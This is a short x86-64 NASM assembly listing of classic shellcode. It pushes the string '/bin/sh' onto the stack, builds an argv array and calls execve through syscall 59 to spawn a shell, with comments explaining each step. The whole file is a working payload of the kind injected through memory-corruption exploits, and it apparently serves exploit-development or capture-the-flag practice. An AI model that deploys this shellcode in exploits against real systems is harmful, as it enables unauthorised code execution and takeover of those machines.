BITS 64
global _start
section .text
_start:
    xor rax, rax
    xor rdx, rdx
    xor rsi, rsi

    ; Push "/bin/sh\x00" — 7 bytes + null fits cleanly in 8 bytes
    ; /bin/sh = 0x0068732f6e69622f
    mov rbx, 0x0068732f6e69622f
    push rbx

    ; rdi = pointer to "/bin/sh\x00"
    mov rdi, rsp

    ; argv = [rdi, NULL]
    push rax                    ; NULL
    push rdi                    ; pointer to string
    mov rsi, rsp

    ; execve("/bin/sh", argv, NULL)
    mov al, 59
    syscall
